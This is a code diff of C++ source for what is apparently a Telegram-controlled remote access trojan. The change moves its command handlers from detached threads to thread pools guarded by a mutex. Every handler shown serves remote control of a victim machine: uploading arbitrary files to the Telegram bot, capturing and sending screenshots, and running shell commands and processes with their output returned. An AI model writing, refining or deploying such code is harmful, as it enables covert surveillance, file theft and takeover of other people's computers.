@@ -3,6 +3,8 @@
 #include "rat/networking.hpp"
 #include "rat/system.hpp"
 #include "rat/media.hpp"
+#include <algorithm>
+#include <mutex>
 #include <thread>
 #include <fmt/core.h>
 #include <fmt/chrono.h>
@@ -18,70 +20,77 @@ constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB;
 constexpr uint8_t TIMEMOUT_FOR_FILEOPS = 255;
 // Command handler implementations
 /*This method cannot run asynchronously for big files because the upload will be interrupted from the https requests that are sent from the parent thread */
+
 void Handler::handleGetCommand() {
     if (command.parameters.empty()) {
-        bot.sendMessage("No file specified");
+        this->bot.sendMessage("No file specified");
         return;
     }
-    
+
     const auto file_path = rat::system::normalizePath(command.parameters[0]);
     if (!std::filesystem::exists(file_path)) {
-        bot.sendMessage(fmt::format("File does not exist: {}", file_path.string()));
+        this->bot.sendMessage(fmt::format("File does not exist: {}", file_path.string()));
         return;
     }
-    
+
     const size_t file_size = std::filesystem::file_size(file_path);
     DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);
-    if(file_size < 2 * 1024 * KB) {
+
+    if (file_size < 2 * 1024 * KB) {
+        // small file → sync
         this->bot.sendFile(file_path);
-    }else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) { // Defined in this file with constexpr
-        // Medium file: send asynchronously 
-        auto unique_copy_backing_bot = std::make_unique<tbot::BaseBot>(backing_bot.getToken(), backing_bot.getMasterId(), TIMEMOUT_FOR_FILEOPS);
-        std::thread([moved_bot = std::move(unique_copy_backing_bot), file_path]() {
+    } else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) {
+        // medium file → async via thread pool
+        this->networking_pool.enqueue([this, file_path] {
             try {
-                DEBUG_LOG("Launching a thread to upload the file {}", file_path.string());
-                moved_bot->sendFile("Uploading the file asynchronously");
-                auto resp = moved_bot->sendFile(file_path);
-                if (resp != rat::tbot::BotResponse::SUCCESS) {
-                    ERROR_LOG("Failed to upload {}", file_path.string());
+                DEBUG_LOG("Async upload {}", file_path.string());
+                {
+                    std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
+                    auto resp = backing_bot.sendFile(file_path);
+                    if (resp != rat::tbot::BotResponse::SUCCESS) {
+                        ERROR_LOG("Failed to upload {}", file_path.string());
+                    }
                 }
             } catch (const std::exception& ex) {
-                const std::string message = fmt::format("Exception in async upload thread: {}", ex.what());
-                ERROR_LOG(message);
-                moved_bot->sendMessage(message);
-            } catch (...) {
-                ERROR_LOG("Unknown exception in async upload thread");
+                ERROR_LOG("Exception in async upload: {}", ex.what());
+                std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
+                this->backing_bot.sendMessage(fmt::format("Upload exception: {}", ex.what()));
             }
-        }).detach();
-//even after fixing the curl timout issue this is still causing a bug, basically I think the thread never achieves the uploads and it never terminates
-    }else {
-        this->bot.sendMessage(fmt::format("File too big for Telegram (max 50 MB or the /get method 2MB), this one is {}", file_size));
+        });
+    } else {
+        this->bot.sendMessage(fmt::format(
+            "File too big for Telegram (max 50 MB or /get method 2MB), this one is {}",
+            file_size
+        ));
     }
 }
+
 void Handler::handleScreenshotCommand() {
     auto image_path = std::filesystem::path(
         fmt::format("{}.jpg", rat::system::getCurrentDateTime_Underscored())
     );
 
-    auto unique_copy_backing_bot = std::make_unique<tbot::BaseBot>(backing_bot.getToken(), backing_bot.getMasterId(), TIMEMOUT_FOR_FILEOPS);
-    // Launch screenshot asynchronously
-    std::thread([moved_bot = std::move(unique_copy_backing_bot), image_path]() {
+    this->process_pool.enqueue([this, image_path] {
         std::string output_buffer;
         bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
-
-        if(success && std::filesystem::exists(image_path)) {
+        
+        std::lock_guard<std::mutex> lock(backing_bot_mutex);
+        
+        if (success && std::filesystem::exists(image_path)) {
             DEBUG_LOG("{} taken", image_path.string());
 
-            if(moved_bot->sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
-                ERROR_LOG("Failed at uploading {}", image_path.string());
+            if (backing_bot.sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
+                ERROR_LOG("Failed uploading {}", image_path.string());
             }
             rat::system::removeFile(image_path);
         }
+
         if (!output_buffer.empty()) {
-            moved_bot->sendMessage(output_buffer);
+            this->backing_bot.sendMessage(output_buffer);
         }
-    }).detach();
-    bot.sendMessage(fmt::format("Screenshot command launched."));
+    });
+
+    this->bot.sendMessage("Screenshot command launched.");
 }
 
 void Handler::parseAndHandleShellCommand() {
@@ -103,8 +112,8 @@ void Handler::parseAndHandleShellCommand() {
         return;
     }
 
-    std::string result = rat::system::runShellCommand(message_text, static_cast<unsigned int>(timeout));
-    bot.sendMessage(result);
+    std::future<std::string> result = rat::system::runShellCommand(message_text, static_cast<unsigned int>(timeout), this->timer_pool);
+    this->backing_bot.sendMessage(result.get());
 }
 
 void Handler::parseAndHandleProcessCommand() {
@@ -125,11 +134,11 @@ void Handler::parseAndHandleProcessCommand() {
         this->bot.sendMessage(fmt::format("Invalid timeout value: {}", timeout_str));
         return;
     }
-    auto fut = rat::system::runProcessAsync(message_text, timeout);
+    auto fut = rat::system::runProcessAsync(message_text, timeout, this->timer_pool);
     this->bot.sendMessage(fmt::format("Process '{}' launched successfully.", message_text));
 
-     auto unique_copy_backing_bot = std::make_unique<tbot::BaseBot>(backing_bot.getToken(), backing_bot.getMasterId(), TIMEMOUT_FOR_FILEOPS);
-    std::thread([moved_bot = std::move(unique_copy_backing_bot), fut = std::move(fut), cmd = message_text]() mutable {
+    this->process_pool.enqueue([this, fut = std::move(fut), cmd = message_text]() mutable {
+        std::unique_lock<std::mutex> backing_bot_lock(this->backing_bot_mutex);
         try {
             DEBUG_LOG("thread has being created + bot object copied {}", sizeof(tbot::Bot));
             auto res = fut.get(); // wait for process to finish
@@ -158,14 +167,14 @@ void Handler::parseAndHandleProcessCommand() {
                 }
             }
             DEBUG_LOG("[{}:{} {}] {}", __FILE__, __LINE__, __func__, feedback);
-            moved_bot->sendMessage(feedback);
+            this->backing_bot.sendMessage(feedback);
 
         } catch (const std::exception& ex) {
             std::string err = fmt::format("Exception waiting for process {}", ex.what());
             ERROR_LOG(err);
-            moved_bot->sendMessage(err);
+            this->backing_bot.sendMessage(err);
         }
-    }).detach();
+    });
 
 }
 
